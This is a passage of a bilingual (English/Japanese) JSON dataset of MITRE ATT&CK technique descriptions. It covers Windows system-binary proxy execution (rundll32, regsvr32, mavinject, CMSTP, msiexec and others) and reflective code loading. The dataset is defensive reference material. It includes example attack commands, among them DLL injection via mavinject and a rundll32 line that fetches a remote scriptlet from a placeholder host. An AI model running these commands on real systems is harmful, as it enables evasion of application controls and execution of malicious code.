                        "description_jp": "攻撃者はodbcconf.exeを悪用して、悪意のあるペイロードの実行をプロキシする可能性があります。Odbcconf.exeは、Open Database Connectivity（ODBC）ドライバーとデータソース名を設定できるWindowsユーティリティです。(引用: Microsoft odbcconf.exe) Odbcconf.exeバイナリはMicrosoftによってデジタル署名されている場合があります。\n\n攻撃者はodbcconf.exeを悪用して、その潜在的な悪用を考慮していないアプリケーション制御ソリューションをバイパスする可能性があります。[Regsvr32](https://attack.mitre.org/techniques/T1218/010)と同様に、odbcconf.exeにはDLLを実行するために悪用される可能性のある<code>REGSVR</code>フラグがあります（例：<code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>）。(引用: LOLBAS Odbcconf)(引用: TrendMicro Squiblydoo Aug 2017)(引用: TrendMicro Cobalt Group Nov 2017)"
                    },
                    {
                        "id": "T1218.015",
                        "name_eng": "Electron Applications",
                        "name_jp": "Electronアプリケーション",
                        "description_eng": "Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams.(Citation: Electron 2) Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS.(Citation: Electron 3) The Chromium engine is used to display web content and Node.js runs the backend code.(Citation: Electron 1)\n\nDue to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework.(Citation: Electron 1) For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe`).(Citation: Electron 6-8)\n\nAdversaries may also execute malicious content by planting malicious [JavaScript](https://attack.mitre.org/techniques/T1059/007) within Electron applications.(Citation: Electron Security)",
                        "description_jp": "攻撃者はElectronフレームワークのコンポーネントを悪用して悪意のあるコードを実行する可能性があります。Electronフレームワークは、Signal、Slack、Microsoft Teamsなどの多くの一般的なアプリケーションをホストしています。(引用: Electron 2) 元々はGitHubによって開発されたElectronは、JavaScript、HTML、CSSなどのWebテクノロジを採用したクロスプラットフォームデスクトップアプリケーション開発フレームワークです。(引用: Electron 3) ChromiumエンジンはWebコンテンツを表示するために使用され、Node.jsはバックエンドコードを実行します。(引用: Electron 1)\n\nElectronの機能的な仕組み（アプリが任意のコマンドを実行できるようにするなど）により、攻撃者はフレームワーク内の正当なツールになりすまして、バックグラウンドで悪意のある機能を実行できる可能性もあります。(引用: Electron 1) 例えば、`teams.exe`や`chrome.exe`の悪用により、攻撃者は正当なアプリケーションの子プロセスとして悪意のあるコマンドを実行できる可能性があります（例：`chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe`）。(引用: Electron 6-8)\n\n攻撃者はまた、Electronアプリケーション内に悪意のある[JavaScript](https://attack.mitre.org/techniques/T1059/007)を仕込むことにより、悪意のあるコンテンツを実行する可能性があります。(引用: Electron Security)"
                    },
                    {
                        "id": "T1218.012",
                        "name_eng": "Verclsid",
                        "name_jp": "Verclsid",
                        "description_eng": "Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe)\n\nAdversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010)). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub)",
                        "description_jp": "攻撃者はverclsid.exeを悪用して、悪意のあるコードの実行をプロキシする可能性があります。Verclsid.exeは、Extension CLSID Verification Hostとして知られており、Windows ExplorerまたはWindows Shellによって使用される前に各シェル拡張機能を検証する責任があります。(引用: WinOSBite verclsid.exe)\n\n攻撃者はverclsid.exeを悪用して悪意のあるペイロードを実行する可能性があります。これは、ファイルがクラスID（CLSID）（COMオブジェクトを識別するために使用される一意の識別番号）によって参照される<code>verclsid.exe /S /C {CLSID}</code>を実行することによって達成される場合があります。verclsid.exeによって実行されるCOMペイロードは、リモートサーバーからCOMスクリプトレット（SCT）をロードして実行するなど（[Regsvr32](https://attack.mitre.org/techniques/T1218/010)と同様）、さまざまな悪意のあるアクションを実行できる可能性があります。バイナリがWindowsシステム上で署名済みおよび/またはネイティブである可能性があるため、verclsid.exeを介した実行のプロキシは、その潜在的な悪用を考慮していないアプリケーション制御ソリューションをバイパスする可能性があります。(引用: LOLBAS Verclsid)(引用: Red Canary Verclsid.exe)(引用: BOHOPS Abusing the COM Registry)(引用: Nick Tyrer GitHub)"
                    },
                    {
                        "id": "T1218.013",
                        "name_eng": "Mavinject",
                        "name_jp": "Mavinject",
                        "description_eng": "Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject)\n\nAdversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation: Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. \n\nIn addition to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.(Citation: Mavinject Functionality Deconstructed)",
                        "description_jp": "攻撃者はmavinject.exeを悪用して、悪意のあるコードの実行をプロキシする可能性があります。Mavinject.exeはMicrosoft Application Virtualization Injectorであり、Microsoft Application Virtualization（App-V）の一部として外部プロセスにコードを注入できるWindowsユーティリティです。(引用: LOLBAS Mavinject)\n\n攻撃者はmavinject.exeを悪用して、実行中のプロセスに悪意のあるDLLを注入し（つまり[ダイナミックリンクライブラリインジェクション](https://attack.mitre.org/techniques/T1055/001)）、任意のコード実行を可能にする可能性があります（例：<code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>）。(引用: ATT Lazarus TTP Evolution)(引用: Reaqta Mavinject) mavinject.exeはMicrosoftによってデジタル署名されている可能性があるため、このメソッドを介した実行のプロキシは、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性があります。\n\n[ダイナミックリンクライブラリインジェクション](https://attack.mitre.org/techniques/T1055/001)に加えて、Mavinject.exeは、その<code>/HMODULE</code>コマンドラインパラメータを介してインポート記述子インジェクションを実行するためにも悪用される可能性があります（例：<code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>）。このコマンドは、指定されたDLLからなるインポートテーブルエントリを、指定されたベースアドレスのモジュールに注入します。(引用: Mavinject Functionality Deconstructed)"
                    },
                    {
                        "id": "T1218.002",
                        "name_eng": "Control Panel",
                        "name_jp": "コントロールパネル",
                        "description_eng": "Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.\n\nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)\n\nMalicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.\n\nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.(Citation: ESET InvisiMole June 2020)",
                        "description_jp": "攻撃者はcontrol.exeを悪用して、悪意のあるペイロードの実行をプロキシする可能性があります。Windowsコントロールパネルプロセスバイナリ（control.exe）は、ユーザーがコンピュータの設定を表示および調整できるようにするユーティリティであるコントロールパネルアイテムの実行を処理します。\n\nコントロールパネルアイテムは、登録済みの実行可能ファイル（.exe）またはコントロールパネル（.cpl）ファイルであり、後者は実際には<code>CPlApplet</code>関数をエクスポートする名前変更されたダイナミックリンクライブラリ（.dll）ファイルです。(引用: Microsoft Implementing CPL)(引用: TrendMicro CPL Malware Jan 2014) 使いやすさのために、コントロールパネルアイテムには通常、登録されてコントロールパネルにロードされた後にユーザーが利用できるグラフィカルメニューが含まれています。(引用: Microsoft Implementing CPL) コントロールパネルアイテムは、コマンドラインから直接実行したり、アプリケーションプログラミングインターフェイス（API）呼び出しを介してプログラムで実行したり、ファイルをダブルクリックするだけで実行したりできます。(引用: Microsoft Implementing CPL)(引用: TrendMicro CPL Malware Jan 2014)(引用: TrendMicro CPL Malware Dec 2013)\n\n悪意のあるコントロールパネルアイテムは、[フィッシング](https://attack.mitre.org/techniques/T1566)キャンペーンを介して配信されたり(引用: TrendMicro CPL Malware Jan 2014)(引用: TrendMicro CPL Malware Dec 2013)、多段階マルウェアの一部として実行されたりする可能性があります。(引用: Palo Alto Reaver Nov 2017) コントロールパネルアイテム、特にCPLファイルは、アプリケーションやファイル拡張子の許可リストもバイパスする可能性があります。\n\n攻撃者はまた、悪意のあるDLLファイル（.dll）の名前をコントロールパネルファイル拡張子（.cpl）に変更し、それらを<code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>に登録する可能性があります。これらの登録済みDLLがCPLファイル仕様に準拠せず、<code>CPlApplet</code>関数をエクスポートしない場合でも、コントロールパネルの実行時に<code>DllEntryPoint</code>を介してロードおよび実行されます。<code>CPlApplet</code>をエクスポートしないCPLファイルは直接実行できません。(引用: ESET InvisiMole June 2020)"
                    },
                    {
                        "id": "T1218.001",
                        "name_eng": "Compiled HTML File",
                        "name_jp": "コンパイル済みHTMLファイル",
                        "description_eng": "Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)\n\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)",
                        "description_jp": "攻撃者はコンパイル済みHTMLファイル（.chm）を悪用して悪意のあるコードを隠蔽する可能性があります。CHMファイルは、Microsoft HTMLヘルプシステムの一部として一般的に配布されます。CHMファイルは、HTMLドキュメント、画像、VBA、JScript、Java、ActiveXなどのスクリプト/Web関連プログラミング言語など、さまざまなコンテンツの圧縮コンパイルです。(引用: Microsoft HTML Help May 2018) CHMコンテンツは、HTMLヘルプ実行可能プログラム（hh.exe）によってロードされるInternet Explorerブラウザの基盤となるコンポーネントを使用して表示されます。(引用: Microsoft HTML Help ActiveX)(引用: Microsoft HTML Help Executable Program)\n\n埋め込みペイロードを含むカスタムCHMファイルが被害者に配信され、[ユーザー実行](https://attack.mitre.org/techniques/T1204)によってトリガーされる可能性があります。CHM実行はまた、hh.exeを介したバイナリの実行を考慮していない古いおよび/またはパッチが適用されていないシステムでアプリケーション制御をバイパスする可能性もあります。(引用: MsitPros CHM Aug 2017)(引用: Microsoft CVE-2017-8625 Aug 2017)"
                    },
                    {
                        "id": "T1218.010",
                        "name_eng": "Regsvr32",
                        "name_jp": "Regsvr32",
                        "description_eng": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",
                        "description_jp": "攻撃者はRegsvr32.exeを悪用して、悪意のあるコードの実行をプロキシする可能性があります。Regsvr32.exeは、Windowsシステム上のダイナミックリンクライブラリ（DLL）を含むオブジェクトリンクおよび埋め込みコントロールを登録および登録解除するために使用されるコマンドラインプログラムです。Regsvr32.exeバイナリはMicrosoftによって署名されている場合もあります。(引用: Microsoft Regsvr32)\n\nRegsvr32.exeの悪意のある使用は、Windowsが通常の操作にRegsvr32.exeを使用することによる許可リストや誤検知のために、Regsvr32.exeプロセスによって実行されロードされたモジュールの実行を監視しない可能性のあるセキュリティツールをトリガーすることを回避する可能性があります。Regsvr32.exeはまた、ユーザー権限でDLLを実行するためのCOMスクリプトレットをロードする機能を使用して、アプリケーション制御を具体的にバイパスするためにも使用できます。Regsvr32.exeはネットワークおよびプロキシ対応であるため、呼び出し中に引数として外部Webサーバー上のファイルへのURL（Uniform Resource Locator）を渡すことにより、スクリプトをロードできます。COMオブジェクトは実際には登録されず実行されるだけなので、このメソッドはレジストリに変更を加えません。(引用: LOLBAS Regsvr32) このテクニックのこのバリエーションは、しばしば「Squiblydoo」と呼ばれ、政府を標的とするキャンペーンで使用されています。(引用: Carbon Black Squiblydoo Apr 2016)(引用: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exeは、[コンポーネントオブジェクトモデルハイジャック](https://attack.mitre.org/techniques/T1546/015)を介して永続性を確立するために使用されるCOMオブジェクトを登録するために利用することもできます。(引用: Carbon Black Squiblydoo Apr 2016)"
                    },
                    {
                        "id": "T1218.004",
                        "name_eng": "InstallUtil",
                        "name_jp": "InstallUtil",
                        "description_eng": "Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>.\n\nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)",
                        "description_jp": "攻撃者はInstallUtilを使用して、信頼できるWindowsユーティリティを介してコードの実行をプロキシする可能性があります。InstallUtilは、.NETバイナリで指定された特定のインストーラーコンポーネントを実行することにより、リソースのインストールとアンインストールを可能にするコマンドラインユーティリティです。(引用: MSDN InstallUtil) InstallUtilバイナリは、Microsoftによってデジタル署名され、Windowsシステムの.NETディレクトリ（<code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code>および<code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>）にある場合があります。\n\nInstallUtilはまた、<code>[System.ComponentModel.RunInstaller(true)]</code>属性で装飾されたクラスを実行するバイナリ内の属性を使用して、アプリケーション制御をバイパスするために使用される場合があります。(引用: LOLBAS Installutil)"
                    },
                    {
                        "id": "T1218.011",
                        "name_eng": "Rundll32",
                        "name_jp": "Rundll32",
                        "description_eng": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion)",
                        "description_jp": "攻撃者はrundll32.exeを悪用して、悪意のあるコードの実行をプロキシする可能性があります。直接実行する（つまり[共有モジュール](https://attack.mitre.org/techniques/T1129)）のではなくrundll32.exeを使用すると、通常の操作からの許可リストや誤検知のためにrundll32.exeプロセスの実行を監視しない可能性のあるセキュリティツールをトリガーすることを回避できる場合があります。Rundll32.exeは一般的にDLLペイロードの実行に関連付けられています（例：<code>rundll32.exe {DLL名, DLL関数}</code>）。\n\nRundll32.exeは、文書化されていないshell32.dll関数<code>Control_RunDLL</code>および<code>Control_RunDLLAsUser</code>を介して[コントロールパネル](https://attack.mitre.org/techniques/T1218/002)アイテムファイル（.cpl）を実行するためにも使用できます。.cplファイルをダブルクリックすると、rundll32.exeも実行されます。(引用: Trend Micro CPL) 例えば、[ClickOnce](https://attack.mitre.org/techniques/T1127/002)はRundll32.exeを介してプロキシできます。\n\nRundll32は、JavaScriptなどのスクリプトを実行するためにも使用できます。これは、次のような構文を使用して行うことができます：<code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code> この動作は、Poweliksなどのマルウェアで使用されていることが確認されています。(引用: This is Security Command Line Confusion)\n\n敵対者はまた、rundll32.exeがDLL関数名をロードする方法を悪用して、分析から悪意のあるコードを隠蔽しようとするかもしれません。さまざまな文字セットのWindows互換性サポートの一環として、rundll32.exeは指定された関数をロードする前に、まずワイド/Unicode、次にANSI文字対応の関数をチェックします（例：コマンド<code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>が与えられた場合、rundll32.exeはまず<code>ExampleFunctionW</code>、それが失敗した場合は<code>ExampleFunctionA</code>を実行しようとし、その後<code>ExampleFunction</code>をロードします）。したがって、敵対者は、複数の同一のエクスポート関数名を作成し、無害なものに<code>W</code>や<code>A</code>を追加することで、悪意のあるコードを隠蔽する可能性があります。(引用：Attackify Rundll32.exe Obscurity）(引用：Github NoRunDll）DLL関数は、序数でエクスポートして実行することもできます（例：<code>rundll32.exe file.dll,#1</code>）。\n\nさらに、攻撃者は[マスカレード](https://attack.mitre.org/techniques/T1036)テクニック（DLLファイル名、ファイル拡張子、または関数名の変更など）を使用して、悪意のあるペイロードの実行をさらに隠蔽する可能性があります。(引用: rundll32.exe defense evasion)"
                    },
                    {
                        "id": "T1218.009",
                        "name_eng": "Regsvcs/Regasm",
                        "name_jp": "Regsvcs/Regasm",
                        "description_eng": "Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)\n\nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)",
                        "description_jp": "攻撃者はRegsvcsとRegasmを悪用して、信頼できるWindowsユーティリティを介してコードの実行をプロキシする可能性があります。RegsvcsとRegasmは、.NET [コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001)（COM）アセンブリを登録するために使用されるWindowsコマンドラインユーティリティです。どちらもMicrosoftによってデジタル署名されている可能性のあるバイナリです。(引用: MSDN Regsvcs)(引用: MSDN Regasm)\n\n両方のユーティリティは、登録または登録解除の前に実行する必要があるコードを指定するためにバイナリ内の属性を使用することにより、アプリケーション制御をバイパスするために使用される場合があります。それぞれ<code>[ComRegisterFunction]</code>または<code>[ComUnregisterFunction]</code>です。登録属性と登録解除属性を持つコードは、プロセスが不十分な権限で実行され実行に失敗した場合でも実行されます。(引用: LOLBAS Regsvcs)(引用: LOLBAS Regasm)"
                    },
                    {
                        "id": "T1218.003",
                        "name_eng": "CMSTP",
                        "name_jp": "CMSTP",
                        "description_eng": "Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.\n\nCMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)",
                        "description_jp": "攻撃者はCMSTPを悪用して、悪意のあるコードの実行をプロキシする可能性があります。Microsoft Connection Manager Profile Installer（CMSTP.exe）は、Connection Managerサービスプロファイルをインストールするために使用されるコマンドラインプログラムです。(引用: Microsoft Connection Manager Oct 2009) CMSTP.exeはインストール情報ファイル（INF）をパラメータとして受け入れ、リモートアクセス接続に利用されるサービスプロファイルをインストールします。\n\n攻撃者は、悪意のあるコマンドに感染したINFファイルをCMSTP.exeに提供する可能性があります。(引用: Twitter CMSTP Usage Jan 2018) [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”と同様に、CMSTP.exeはリモートサーバーからDLL (引用: MSitPros CMSTP Aug 2017) やCOMスクリプトレット(SCT)をロードして実行するために悪用される可能性があります。(引用: Twitter CMSTP Jan 2018)(引用: GitHub Ultimate AppLocker Bypass List)(引用: Endurant CMSTP July 2018) この実行は、CMSTP.exeがMicrosoftによって署名されている可能性のある正当なバイナリであるため、AppLockerやその他のアプリケーション制御防御もバイパスする可能性があります。\n\nCMSTP.exeはまた、自動昇格COMインターフェイスを介して悪意のあるINFから任意のコマンドを実行するために、[ユーザーアカウント制御のバイパス](https://attack.mitre.org/techniques/T1548/002)を悪用するためにも使用できます。(引用: MSitPros CMSTP Aug 2017)(引用: GitHub Ultimate AppLocker Bypass List)(引用: Endurant CMSTP July 2018)"
                    },
                    {
                        "id": "T1218.007",
                        "name_eng": "Msiexec",
                        "name_jp": "Msiexec",
                        "description_eng": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",
                        "description_jp": "攻撃者はmsiexec.exeを悪用して、悪意のあるペイロードの実行をプロキシする可能性があります。Msiexec.exeはWindowsインストーラーのコマンドラインユーティリティであり、したがって一般的にインストールパッケージ（.msi）の実行に関連付けられています。(引用: Microsoft msiexec) Msiexec.exeバイナリはMicrosoftによってデジタル署名されている場合もあります。\n\n攻撃者はmsiexec.exeを悪用して、ローカルまたはネットワークアクセス可能なMSIファイルを起動する可能性があります。Msiexec.exeはDLLも実行できます。(引用: LOLBAS Msiexec)(引用: TrendMicro Msiexec Feb 2018) Windowsシステム上で署名済みかつネイティブである可能性があるため、msiexec.exeはその潜在的な悪用を考慮しないアプリケーション制御ソリューションをバイパスするために使用できます。<code>AlwaysInstallElevated</code>ポリシーが有効になっている場合、Msiexec.exeの実行はSYSTEM権限に昇格される可能性もあります。(引用: Microsoft AlwaysInstallElevated 2018)"
                    }
                ]
            },
            {
                "id": "T1620",
                "name_eng": "Reflective Code Loading",
                "name_jp": "リフレクティブコードローディング",
                "description_eng": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
